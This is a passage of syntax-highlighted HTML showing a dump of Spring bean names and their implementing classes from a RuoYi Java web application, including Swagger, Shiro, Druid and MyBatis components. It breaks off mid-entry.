<span class="hljs-string">&quot;springfox.documentation.swagger.configuration.SwaggerCommonConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.configuration.SwaggerCommonConfiguration$$EnhancerBySpringCGLIB$$2cf8ac91&quot;</span><br> <span class="hljs-string">&quot;mvcUriComponentsContributor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.method.support.CompositeUriComponentsContributor&quot;</span><br> <span class="hljs-string">&quot;messageSource&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.context.support.ResourceBundleMessageSource&quot;</span><br> <span class="hljs-string">&quot;genController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.generator.controller.GenController$$EnhancerBySpringCGLIB$$afa987ba&quot;</span><br> <span class="hljs-string">&quot;sysJobLogController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.quartz.controller.SysJobLogController$$EnhancerBySpringCGLIB$$5668d9f4&quot;</span><br> <span class="hljs-string">&quot;operationParameterReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.OperationParameterReader&quot;</span><br> <span class="hljs-string">&quot;springfox.bean.validators.configuration.BeanValidatorPluginsConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.configuration.BeanValidatorPluginsConfiguration$$EnhancerBySpringCGLIB$$ba979319&quot;</span><br> <span class="hljs-string">&quot;documentationPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;taskExecutorBuilder&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.task.TaskExecutorBuilder&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.JdbcTemplateConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.JdbcTemplateConfiguration&quot;</span><br> <span class="hljs-string">&quot;templateEngine&quot;</span> -&gt; <span class="hljs-string">&quot;org.thymeleaf.spring5.SpringTemplateEngine&quot;</span><br> <span class="hljs-string">&quot;platformTransactionManagerCustomizers&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.transaction.TransactionManagerCustomizers&quot;</span><br> <span class="hljs-string">&quot;springfox.boot.starter.autoconfigure.OpenApiAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.boot.starter.autoconfigure.OpenApiAutoConfiguration$$EnhancerBySpringCGLIB$$9866c7b1&quot;</span><br> <span class="hljs-string">&quot;contentParameterAggregator&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.ContentParameterAggregator&quot;</span><br> <span class="hljs-string">&quot;defaultServletHandlerMapping&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.beans.factory.support.NullBean&quot;</span><br> <span class="hljs-string">&quot;globalExceptionHandler&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.web.exception.GlobalExceptionHandler&quot;</span><br> <span class="hljs-string">&quot;persistenceExceptionTranslationPostProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.dao.annotation.PersistenceExceptionTranslationPostProcessor&quot;</span><br> <span class="hljs-string">&quot;resourceGroupCache&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.DocumentationCache&quot;</span><br> <span class="hljs-string">&quot;characterEncodingFilter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.servlet.filter.OrderedCharacterEncodingFilter&quot;</span><br> <span class="hljs-string">&quot;sessionDAO&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.shiro.session.OnlineSessionDAO&quot;</span><br> <span class="hljs-string">&quot;sameUrlDataInterceptor&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.interceptor.impl.SameUrlDataInterceptor&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration$DispatcherServletRegistrationConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration$DispatcherServletRegistrationConfiguration&quot;</span><br> <span class="hljs-string">&quot;preserveErrorControllerTargetClassPostProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration$PreserveErrorControllerTargetClassPostProcessor&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$JacksonObjectMapperBuilderConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$JacksonObjectMapperBuilderConfiguration&quot;</span><br> <span class="hljs-string">&quot;sysNoticeMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy301&quot;</span><br> <span class="hljs-string">&quot;propertySourcesPlaceholderConfigurer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.context.support.PropertySourcesPlaceholderConfigurer&quot;</span><br> <span class="hljs-string">&quot;genTableMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy304&quot;</span><br> <span class="hljs-string">&quot;parameterSize&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.parameter.SizeAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;ruoYiApplication&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.RuoYiApplication$$EnhancerBySpringCGLIB$$93c82727&quot;</span><br> <span class="hljs-string">&quot;spring.datasource.druid-com.alibaba.druid.spring.boot.autoconfigure.properties.DruidStatProperties&quot;</span> -&gt; <span class="hljs-string">&quot;com.alibaba.druid.spring.boot.autoconfigure.properties.DruidStatProperties&quot;</span><br> <span class="hljs-string">&quot;serverConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.common.config.ServerConfig&quot;</span><br> <span class="hljs-string">&quot;documentationPluginsBootstrapper&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.plugins.DocumentationPluginsBootstrapper&quot;</span><br> <span class="hljs-string">&quot;methodValidationPostProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.validation.beanvalidation.FilteredMethodValidationPostProcessor&quot;</span><br> <span class="hljs-string">&quot;stringHttpMessageConverter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration$TomcatWebServerFactoryCustomizerConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration$TomcatWebServerFactoryCustomizerConfiguration&quot;</span><br> <span class="hljs-string">&quot;jsonComponentModule&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.jackson.JsonComponentModule&quot;</span><br> <span class="hljs-string">&quot;syntheticModelProviderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;swaggerConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.core.config.SwaggerConfig$$EnhancerBySpringCGLIB$$2389560a&quot;</span><br> <span class="hljs-string">&quot;demoFormController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.demo.controller.DemoFormController&quot;</span><br> <span class="hljs-string">&quot;org.springframework.context.event.internalEventListenerFactory&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.context.event.DefaultEventListenerFactory&quot;</span><br> <span class="hljs-string">&quot;scheduledBeanLazyInitializationExcludeFilter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.task.ScheduledBeanLazyInitializationExcludeFilter&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFactoryCustomizerAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;mappingJackson2HttpMessageConverter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;</span><br> <span class="hljs-string">&quot;modelPropertyBuilderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;spring.h2.console-org.springframework.boot.autoconfigure.h2.H2ConsoleProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.h2.H2ConsoleProperties&quot;</span><br> <span class="hljs-string">&quot;springfox.documentation.spring.web.SpringfoxWebMvcConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.SpringfoxWebMvcConfiguration$$EnhancerBySpringCGLIB$$643c661d&quot;</span><br> <span class="hljs-string">&quot;vendorExtensionsReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.VendorExtensionsReader&quot;</span><br> <span class="hljs-string">&quot;expandedParameterBuilder&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.parameter.ExpandedParameterBuilder&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration$DefaultTemplateResolverConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration$DefaultTemplateResolverConfiguration&quot;</span><br> <span class="hljs-string">&quot;typeResolver&quot;</span> -&gt; <span class="hljs-string">&quot;com.fasterxml.classmate.TypeResolver&quot;</span><br> <span class="hljs-string">&quot;createRestApi&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.plugins.Docket&quot;</span><br> <span class="hljs-string">&quot;defaultOperationReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.DefaultOperationReader&quot;</span><br> <span class="hljs-string">&quot;statViewServletRegistrationBean&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.servlet.ServletRegistrationBean&quot;</span><br> <span class="hljs-string">&quot;openApiControllerWebMvc&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.web.OpenApiControllerWebMvc&quot;</span><br> <span class="hljs-string">&quot;responseMessagesReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.ResponseMessagesReader&quot;</span><br> <span class="hljs-string">&quot;servletWebServerFactoryCustomizer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactoryCustomizer&quot;</span><br> <span class="hljs-string">&quot;mvcUrlPathHelper&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.util.UrlPathHelper&quot;</span><br> <span class="hljs-string">&quot;transactionTemplate&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.transaction.support.TransactionTemplate&quot;</span><br> <span class="hljs-string">&quot;factoryMethodProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.property.FactoryMethodProvider&quot;</span><br> <span class="hljs-string">&quot;sysMenuController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysMenuController$$EnhancerBySpringCGLIB$$dc837a84&quot;</span><br> <span class="hljs-string">&quot;oasSecurityMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.mappers.OasSecurityMapperImpl&quot;</span><br> <span class="hljs-string">&quot;org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.transaction.annotation.ProxyTransactionManagementConfiguration&quot;</span><br> <span class="hljs-string">&quot;dataSourceAspect&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.aspectj.DataSourceAspect&quot;</span><br> <span class="hljs-string">&quot;com.ruoyi.framework.config.ApplicationConfig#MapperScannerRegistrar#0&quot;</span> -&gt; <span class="hljs-string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span><br> <span class="hljs-string">&quot;mybatis-org.mybatis.spring.boot.autoconfigure.MybatisProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.mybatis.spring.boot.autoconfigure.MybatisProperties&quot;</span><br> <span class="hljs-string">&quot;swaggerParameterDescriptionReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.parameter.ApiParamParameterBuilder&quot;</span><br> <span class="hljs-string">&quot;threadPoolConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.common.config.thread.ThreadPoolConfig$$EnhancerBySpringCGLIB$$e1d985b8&quot;</span><br> <span class="hljs-string">&quot;spring.sql.init-org.springframework.boot.autoconfigure.sql.init.SqlInitializationProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.sql.init.SqlInitializationProperties&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$Jackson2ObjectMapperBuilderCustomizerConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$Jackson2ObjectMapperBuilderCustomizerConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration$StringHttpMessageConverterConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfiguration$StringHttpMessageConverterConfiguration&quot;</span><br> <span class="hljs-string">&quot;optionalLiveReloadServer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.OptionalLiveReloadServer&quot;</span><br> <span class="hljs-string">&quot;demoTableController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.demo.controller.DemoTableController&quot;</span><br> <span class="hljs-string">&quot;openApiOperationAuthReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OpenApiOperationAuthReader&quot;</span><br> <span class="hljs-string">&quot;standardJacksonObjectMapperBuilderCustomizer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$Jackson2ObjectMapperBuilderCustomizerConfiguration$StandardJackson2ObjectMapperBuilderCustomizer&quot;</span><br> <span class="hljs-string">&quot;springfox.documentation.schema.configuration.ModelsConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.configuration.ModelsConfiguration$$EnhancerBySpringCGLIB$$f698197b&quot;</span><br> <span class="hljs-string">&quot;taskSchedulerBuilder&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.task.TaskSchedulerBuilder&quot;</span><br> <span class="hljs-string">&quot;openApiResponseReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OpenApiResponseReader&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;springfox.documentation.spring.web.SpringfoxWebConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.SpringfoxWebConfiguration$$EnhancerBySpringCGLIB$$2fb0e29d&quot;</span><br> <span class="hljs-string">&quot;jacksonEnumTypeDeterminer&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.JacksonEnumTypeDeterminer&quot;</span><br> <span class="hljs-string">&quot;localeChangeInterceptor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.i18n.LocaleChangeInterceptor&quot;</span><br> <span class="hljs-string">&quot;captchaProducerMath&quot;</span> -&gt; <span class="hljs-string">&quot;com.google.code.kaptcha.impl.DefaultKaptcha&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;sysShiroService&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.shiro.service.SysShiroService&quot;</span><br> <span class="hljs-string">&quot;transactionInterceptor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.transaction.interceptor.TransactionInterceptor&quot;</span><br> <span class="hljs-string">&quot;swaggerExpandedParameterBuilder&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.parameter.SwaggerExpandedParameterBuilder&quot;</span><br> <span class="hljs-string">&quot;shiroFilterFactoryBean&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.shiro.web.CustomShiroFilterFactoryBean$MySpringShiroFilter&quot;</span><br> <span class="hljs-string">&quot;spring.mvc-org.springframework.boot.autoconfigure.web.servlet.WebMvcProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.WebMvcProperties&quot;</span><br> <span class="hljs-string">&quot;sysUserRoleMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy287&quot;</span><br> <span class="hljs-string">&quot;inMemorySwaggerResourcesProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.web.InMemorySwaggerResourcesProvider&quot;</span><br> <span class="hljs-string">&quot;multipartConfigElement&quot;</span> -&gt; <span class="hljs-string">&quot;javax.servlet.MultipartConfigElement&quot;</span><br> <span class="hljs-string">&quot;parameterBuilderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;requestContextFilter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.servlet.filter.OrderedRequestContextFilter&quot;</span><br> <span class="hljs-string">&quot;webMvcObjectMapperConfigurer&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.WebMvcObjectMapperConfigurer&quot;</span><br> <span class="hljs-string">&quot;testController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.tool.TestController&quot;</span><br> <span class="hljs-string">&quot;sysPasswordService&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.shiro.service.SysPasswordService&quot;</span><br> <span class="hljs-string">&quot;com.alibaba.druid.spring.boot.autoconfigure.stat.DruidStatViewServletConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;com.alibaba.druid.spring.boot.autoconfigure.stat.DruidStatViewServletConfiguration&quot;</span><br> <span class="hljs-string">&quot;apiListingBuilderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;masterDataSource&quot;</span> -&gt; <span class="hljs-string">&quot;com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceWrapper&quot;</span><br> <span class="hljs-string">&quot;jsonSerializer&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.json.JsonSerializer&quot;</span><br> <span class="hljs-string">&quot;dataScopeAspect&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.aspectj.DataScopeAspect&quot;</span><br> <span class="hljs-string">&quot;restTemplateBuilder&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.client.RestTemplateBuilder&quot;</span><br> <span class="hljs-string">&quot;localeResolver&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.i18n.SessionLocaleResolver&quot;</span><br> <span class="hljs-string">&quot;handlerFunctionAdapter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.function.support.HandlerFunctionAdapter&quot;</span><br> <span class="hljs-string">&quot;shutdownManager&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.manager.ShutdownManager&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.NamedParameterJdbcTemplateConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.NamedParameterJdbcTemplateConfiguration&quot;</span><br> <span class="hljs-string">&quot;spring.transaction-org.springframework.boot.autoconfigure.transaction.TransactionProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.transaction.TransactionProperties&quot;</span><br> <span class="hljs-string">&quot;classPathFileSystemWatcher&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.classpath.ClassPathFileSystemWatcher&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.HttpEncodingAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.HttpEncodingAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;sysOperLogServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysOperLogServiceImpl&quot;</span><br> <span class="hljs-string">&quot;springApplicationAdminRegistrar&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar&quot;</span><br> <span class="hljs-string">&quot;welcomePageNotAcceptableHandlerMapping&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.WelcomePageNotAcceptableHandlerMapping&quot;</span><br> <span class="hljs-string">&quot;pathSanitizer&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.paths.PathSanitizer&quot;</span><br> <span class="hljs-string">&quot;spring.resources-org.springframework.boot.autoconfigure.web.ResourceProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.ResourceProperties&quot;</span><br> <span class="hljs-string">&quot;requestParameterMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.mappers.RequestParameterMapperImpl&quot;</span><br> <span class="hljs-string">&quot;captchaProducer&quot;</span> -&gt; <span class="hljs-string">&quot;com.google.code.kaptcha.impl.DefaultKaptcha&quot;</span><br> <span class="hljs-string">&quot;typeNameExtractor&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.TypeNameExtractor&quot;</span><br> <span class="hljs-string">&quot;oasLicenceMapper&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.mappers.OasLicenceMapper&quot;</span><br> <span class="hljs-string">&quot;webStatFilterRegistrationBean&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.servlet.FilterRegistrationBean&quot;</span><br> <span class="hljs-string">&quot;springUtils&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.common.utils.spring.SpringUtils&quot;</span><br> <span class="hljs-string">&quot;apiListingScanner&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.scanners.ApiListingScanner&quot;</span><br> <span class="hljs-string">&quot;operationModelsProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.operation.OperationModelsProvider&quot;</span><br> <span class="hljs-string">&quot;operationImplicitParameterReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OperationImplicitParameterReader&quot;</span><br> <span class="hljs-string">&quot;apiModelPropertyPropertyBuilder&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.schema.ApiModelPropertyPropertyBuilder&quot;</span><br> <span class="hljs-string">&quot;swaggerMediaTypeReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.SwaggerMediaTypeReader&quot;</span><br> <span class="hljs-string">&quot;apiModelReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.scanners.ApiModelReader&quot;</span><br> <span class="hljs-string">&quot;mvcContentNegotiationManager&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.accept.ContentNegotiationManager&quot;</span><br> <span class="hljs-string">&quot;objectNamingStrategy&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jmx.ParentAwareNamingStrategy&quot;</span><br> <span class="hljs-string">&quot;conditionEvaluationDeltaLoggingListener&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.ConditionEvaluationDeltaLoggingListener&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.task.TaskSchedulingAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.task.TaskSchedulingAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;parameterNotNull&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.parameter.NotNullAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;httpRequestHandlerAdapter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter&quot;</span><br> <span class="hljs-string">&quot;modelSpecificationMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.mappers.ModelSpecificationMapperImpl&quot;</span><br> <span class="hljs-string">&quot;notBlankPlugin&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.schema.NotBlankAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;druidProperties&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.config.properties.DruidProperties$$EnhancerBySpringCGLIB$$7f55fe2b&quot;</span><br> <span class="hljs-string">&quot;userRealm&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.shiro.realm.UserRealm&quot;</span><br> <span class="hljs-string">&quot;sysUserController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysUserController$$EnhancerBySpringCGLIB$$2273bc48&quot;</span><br> <span class="hljs-string">&quot;spring.servlet.multipart-org.springframework.boot.autoconfigure.web.servlet.MultipartProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.MultipartProperties&quot;</span><br> <span class="hljs-string">&quot;demoIconController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.demo.controller.DemoIconController&quot;</span><br> <span class="hljs-string">&quot;org.springframework.context.annotation.internalCommonAnnotationProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.context.annotation.CommonAnnotationBeanPostProcessor&quot;</span><br> <span class="hljs-string">&quot;sysDeptServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysDeptServiceImpl$$EnhancerBySpringCGLIB$$7daf1de0&quot;</span><br> <span class="hljs-string">&quot;operationPositionReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OperationPositionReader&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.LocalDevToolsAutoConfiguration$RestartConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.LocalDevToolsAutoConfiguration$RestartConfiguration&quot;</span><br> <span class="hljs-string">&quot;resourceHandlerMapping&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.handler.SimpleUrlHandlerMapping&quot;</span><br> <span class="hljs-string">&quot;simpleControllerHandlerAdapter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration$ThymeleafWebMvcConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration$ThymeleafWebMvcConfiguration&quot;</span><br> <span class="hljs-string">&quot;i18nConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.config.I18nConfig$$EnhancerBySpringCGLIB$$76ead511&quot;</span><br> <span class="hljs-string">&quot;jacksonJsonViewProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.JacksonJsonViewProvider&quot;</span><br> <span class="hljs-string">&quot;sysRoleServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysRoleServiceImpl$$EnhancerBySpringCGLIB$$69302cd&quot;</span><br> <span class="hljs-string">&quot;demoReportController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.demo.controller.DemoReportController&quot;</span><br> <span class="hljs-string">&quot;sysUserPostMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy291&quot;</span><br> <span class="hljs-string">&quot;spring.lifecycle-org.springframework.boot.autoconfigure.context.LifecycleProperties&quot;</span> -&gt; <span 